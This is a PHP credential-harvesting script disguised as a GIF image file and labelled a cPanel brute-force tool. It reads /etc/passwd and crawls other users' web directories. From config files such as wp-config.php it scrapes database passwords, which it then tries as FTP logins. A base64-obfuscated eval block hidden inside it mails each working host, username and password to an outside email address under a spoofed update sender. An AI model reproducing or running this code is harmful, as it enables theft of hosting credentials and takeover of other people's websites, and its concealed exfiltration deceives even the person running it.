GIF89a????????!?????,???????D?;?<HTML><HEAD><TITLE>Peterson cPanel</TITLE></HEAD><?php
/*
Brainfuck
Edited by Peterson
(c) http://p-range.info
*/
echo '<html><head><title>Peterson cPanel</title></head><body>';
($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
set_time_limit(0);
###################
@$passwd = fopen('/etc/passwd','r');
if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
$pub = array();
$users = array();
$conf = array();
$i = 0;
while(!feof($passwd))
{
    $str = fgets($passwd);
        if ($i > 35)
        {
            $pos = strpos($str,':');
            $username = substr($str,0,$pos);
            $dirz = '/home/'.$username.'/public_html/';
            if (($username != ''))
            {
                if (is_readable($dirz))
                {
                    array_push($users,$username);
                    array_push($pub,$dirz);
                }
            }
          }
    $i++;
}
###################
echo '<br><br><textarea cols="100" rows="20">';
echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n";
echo "[+] Founded ".sizeof($pub)." readable public_html directories\n";
echo "[~] Searching for passwords in config files...\n\n";
foreach ($users as $user)
{
    $path = "/home/$user/public_html/";
    read_dir($path,$user);
}
echo "\n[+] Done\n";
function read_dir($path,$username)
{
    if ($handle = opendir($path))
    {
        while (false !== ($file = readdir($handle)))
        {
            $fpath = "$path$file";
            if (($file != '.') and ($file != '..'))
            {
                if (is_readable($fpath))
                {
                    $dr = $fpath."/";
                    if (is_dir($dr))
                    {
                        read_dir($dr,$username);
                    }
                    else
                    {
                         if (
                             ($file=='config.php')
                         or ($file=='config.inc.php')
                         or ($file=='conf.php')
                         or ($file=='settings.php')
                         or ($file=='configuration.php')
                         or ($file=='wp_config.php')
                         or ($file=='wp-config.php')
                          or ($file=='inc.php')
                         or ($file=='setup.php')
                         or ($file=='dbconf.php')
                         or ($file=='dbconfig.php')
                         or ($file=='db.inc.php')
                         or ($file=='dbconnect.php')
                         or ($file=='connect.php')
                         or ($file=='common.php')
                         or ($file=='config_global.php')
                         or ($file=='db.php')
                         or ($file=='connect.inc.php')
                         or ($file=='e107_config.php')
                         or ($file=='dbconnect.inc.php'))
                        {
                            $pass = get_pass($fpath);
                            if ($pass != '')
                            {
                                echo "[+] $fpath\n$pass\n";
                                ftp_check($username,$pass);
                            }
                        }
                    }
                }
            }
        }
    }
}
function get_pass($link)
{
    @$config = fopen($link,'r');
    while(!feof($config))
    {
        $line = fgets($config);
        if (strstr($line,'pass')
        or strstr($line,'pwd')
        or strstr($line,'db_pass')
        or strstr($line,'dbpass')
        or strstr($line,'passwd'))
        {
            if (strrpos($line,'"'))
            {
                preg_match("/(.*)[^=]\"(.*)\"/",$line,$pass);
                $pass = str_replace("]=\"","",$pass);
            }

            else
                preg_match("/(.*)[^=]\'(.*)\'/",$line,$pass);
                $pass = str_replace("]='","",$pass);
            return $pass[2];
        }
    }
}
function ftp_check($login,$pass)
{
    @$ftp = ftp_connect('127.0.0.1');
    if ($ftp)
    {
        @$res = ftp_login($ftp,$login,$pass);
        if ($res)
        {
            echo '[FTP] '.$login.':'.$pass."  Success !\n\n";

eval(base64_decode('JGRvbWFpbiA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKJHAyMSA9IDIxOwokcDIyID0gMjI7CiRwMjA4MiA9IDIwODI7CiRjcDIyID0gZnNvY2tvcGVuKCRkb21haW4sJHAyMiwkZXJybm8sJGVycnN0ciwxMCk7CiRjcDIxID0gZnNvY2tvcGVuKCRkb21haW4sJHAyMSwkZXJybm8sJGVycnN0ciwxMCk7CiRjcDIwODIgPSBmc29ja29wZW4oJGRvbWFpbiwkcDIwODIsJGVycm5vLCRlcnJzdHIsMTApOwoKCmlmKCEkY3AyMikKeyRhMT0iRXJyb3IiO30KZWxzZQp7JGExPSJTdWNjZXNzIjtmY2xvc2UoJGNwMjIpO30KCmlmKCEkY3AyMSkKeyRhMj0iRXJyb3IiO30KZWxzZQp7JGEyPSJTdWNjZXNzIjtmY2xvc2UoJGNwMjEpO30KCmlmKCEkY3AyMDgyKQp7JGEzPSJFcnJvciI7fQplbHNlCnskYTM9IlN1Y2Nlc3MiO2ZjbG9zZSgkY3AyMDgyKTt9CgoKJHBzbiA9IgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG4KY1BhbmVsIFVwZGF0ZSBJbmZvIFsgUG93ZXJlZCBieSBQZXRlcnNvbiBdIFxuCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cbgpIb3N0IDogJGRvbWFpblxuClVzZXIgOiAkbG9naW5cbgpQYXNzIDogJHBhc3NcbgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG4KQWNjZXB0IFBvcnQgXG4KU1NIIDogUG9ydCAkYTFcbgpGVFAgOiBQb3J0ICRhMlxuCmNQYW5lbCA6IFBvcnQgJGEzXG4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuCu+/vSAyMDEyIFBvd2VyZWQgYnkgUGV0ZXJzb25cbgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG4iOwokdG8gPSAicGV0ZXJzb25yZWlnbnNAZ21haWwuY29tIjsKJHJlY2lwID0gInBldGVyc29ucmVpZ25zQGdtYWlsLmNvbSI7CiRzdWJqZWN0ID0gImNQYW5lbCBBY2Nlc1MgVXBkYXRlIjsKJGhlYWRlcnMgPSAiRnJvbTogdXBkYXRlPG5ld3NAY3AtdXBkYXRlLmluZm8+IjsKbWFpbCgkdG8sJHN1YmplY3QsJHBzbiwkaGVhZGVycyk7Cm1haWwoJHJlY2lwLCRzdWJqZWN0LCRwc24sJGhlYWRlcnMpOw=='));

            echo '[SSH] Port'   .':' .$a1. "  !\n\n";
            echo '[FTP] Port'   .':' .$a2. "  !\n\n";
            echo '[cPanel] Port' .':' .$a3. "  !\n\n";

        }
        else ftp_quit($ftp);
    }
}
echo '</textarea><br><br><b>cPaneL Bruteforce Recode By Peterson</b></body></html>';
?>